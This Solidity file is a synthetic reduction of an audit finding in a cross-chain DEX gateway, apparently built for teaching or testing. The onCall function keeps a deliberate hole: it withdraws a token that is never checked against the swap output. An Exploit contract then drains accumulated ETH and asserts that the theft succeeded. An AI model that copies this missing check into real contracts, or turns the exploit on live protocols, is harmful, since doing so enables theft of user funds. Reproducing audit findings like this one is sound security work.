// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*//////////////////////////////////////////////////////////////////////////
    DODO Cross-Chain DEX — [H-1] Missing swap-withdrawal validation enables
    accumulated token drainage (Sherlock 2025-05-dodo-cross-chain-dex, #58578)

    SYNTHETIC, CHEATCODE-FREE reduction for the EVM Playground.
    Root cause: GatewayCrossChain.onCall swaps via params.toToken but withdraws
    decoded.targetZRC20 with no equality check. Attacker swaps cheap input →
    cheap output, then withdraws a different high-value token already sitting
    in the gateway from prior operations. Blamed withdraw path uses
    targetZRC20 without validating against the swap output (@> VULN).
//////////////////////////////////////////////////////////////////////////*/

contract MockERC20 {
    string public symbol;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    constructor(string memory _symbol) {
        symbol = _symbol;
    }

    function mint(address to, uint256 amt) external {
        balanceOf[to] += amt;
    }

    function approve(address spender, uint256 amt) external returns (bool) {
        allowance[msg.sender][spender] = amt;
        return true;
    }

    function transfer(address to, uint256 amt) external returns (bool) {
        balanceOf[msg.sender] -= amt;
        balanceOf[to] += amt;
        return true;
    }

    function transferFrom(address from, address to, uint256 amt) external returns (bool) {
        if (msg.sender != from) {
            uint256 a = allowance[from][msg.sender];
            require(a >= amt, "allow");
            allowance[from][msg.sender] = a - amt;
        }
        balanceOf[from] -= amt;
        balanceOf[to] += amt;
        return true;
    }
}

/// @dev Minimal mix-swap: 1:1 from→to for the synthetic (price is not the bug).
contract MockMixSwap {
    function mixSwap(address fromToken, address toToken, uint256 amount) external returns (uint256) {
        MockERC20(fromToken).transferFrom(msg.sender, address(this), amount);
        // Mint/transfer output 1:1 for simplicity.
        MockERC20(toToken).transfer(msg.sender, amount);
        return amount;
    }
}

/// @notice Reduction of GatewayCrossChain.onCall + withdraw path.
///         Source: GatewayCrossChain.sol#L465-L508, #L371-L376, #L431-L437
///         (sherlock-audit/2025-05-dodo-cross-chain-dex @ d4834a4).
contract GatewayCrossChain {
    MockMixSwap public immutable swapRouter;
    uint256 public constant GAS_FEE = 0; // abstract away gas for the synthetic

    constructor(MockMixSwap _swap) {
        swapRouter = _swap;
    }

    /// @dev Models onCall after ZetaChain delivers `amount` of `fromZRC20`.
    ///      `toToken` = params.toToken (swap output); `targetZRC20` = withdrawal token.
    function onCall(
        address fromZRC20,
        uint256 amount,
        address toToken,
        address targetZRC20,
        address receiver
    ) external {
        // Pull input (already credited to gateway in the real flow; attacker
        // pre-transfers or we pull from msg.sender for the synthetic).
        require(MockERC20(fromZRC20).transferFrom(msg.sender, address(this), amount), "in");

        // Swap occurs with params.toToken as output
        uint256 outputAmount = _doMixSwap(fromZRC20, toToken, amount);

        // FIX: require(toToken == targetZRC20, "swap/target mismatch");
        // _handleBitcoinWithdraw / _handleEvmOrSolanaWithdraw:
        _withdraw(targetZRC20, receiver, outputAmount - GAS_FEE); // @> VULN: withdraws targetZRC20 using swap outputAmount with no check that targetZRC20 == toToken — drains accumulated high-value balances
    }

    function _doMixSwap(address fromToken, address toToken, uint256 amount) internal returns (uint256) {
        MockERC20(fromToken).approve(address(swapRouter), amount);
        return swapRouter.mixSwap(fromToken, toToken, amount);
    }

    function _withdraw(address token, address receiver, uint256 amount) internal {
        // Uses targetZRC20 (no validation against swap output)
        require(MockERC20(token).transfer(receiver, amount), "out");
    }
}

/// CREATE order: btc (1), usdc (2), eth (3), swap (4), gateway (5), attackerRecv (6).
contract AttackerReceiver {
    // just holds drained tokens
}

contract Exploit {
    MockERC20 public btc; // cheap input (BTC.ZRC20 stand-in)
    MockERC20 public usdc; // swap output (not withdrawn)
    MockERC20 public eth; // accumulated high-value target
    MockMixSwap public swapRouter;
    GatewayCrossChain public gateway;
    AttackerReceiver public attackerRecv;

    uint256 public stolen;
    uint256 public constant ACCUMULATED_ETH = 1000 ether;
    uint256 public constant ATTACK_BTC = 1 ether; // 1 unit in → drains 1 unit of ETH (1:1 synthetic)

    constructor() {
        btc = new MockERC20("BTC.Z"); // 1
        usdc = new MockERC20("USDC.Z"); // 2
        eth = new MockERC20("ETH.Z"); // 3
        swapRouter = new MockMixSwap(); // 4
        gateway = new GatewayCrossChain(swapRouter); // 5
        attackerRecv = new AttackerReceiver(); // 6

        // Preload swap router with USDC inventory for the BTC→USDC swap.
        usdc.mint(address(swapRouter), 10_000 ether);
        // Protocol accumulated ETH.ZRC20 from prior operations.
        eth.mint(address(gateway), ACCUMULATED_ETH);
        // Attacker starts with BTC.ZRC20.
        btc.mint(address(this), ATTACK_BTC);
    }

    function run() external {
        uint256 gwEthBefore = eth.balanceOf(address(gateway));
        uint256 recvBefore = eth.balanceOf(address(attackerRecv));

        // Malicious onCall: swap BTC→USDC, withdraw ETH (mismatch).
        btc.approve(address(gateway), ATTACK_BTC);
        gateway.onCall(
            address(btc), // from: attacker input
            ATTACK_BTC,
            address(usdc), // toToken: swap output (USDC) — NOT the target
            address(eth), // targetZRC20: accumulated high-value ETH
            address(attackerRecv)
        );

        stolen = eth.balanceOf(address(attackerRecv)) - recvBefore;
        uint256 drained = gwEthBefore - eth.balanceOf(address(gateway));

        // Harm: attacker receives ETH from accumulated balance; gateway loses it.
        // Swap left USDC sitting on the gateway; ETH was withdrawn instead.
        require(stolen == ATTACK_BTC, "stolen amount");
        require(drained == ATTACK_BTC, "drained");
        require(eth.balanceOf(address(gateway)) == ACCUMULATED_ETH - ATTACK_BTC, "gw eth");
        require(usdc.balanceOf(address(gateway)) == ATTACK_BTC, "usdc left on gw");
        require(stolen > 0, "harm not demonstrated");
    }
}
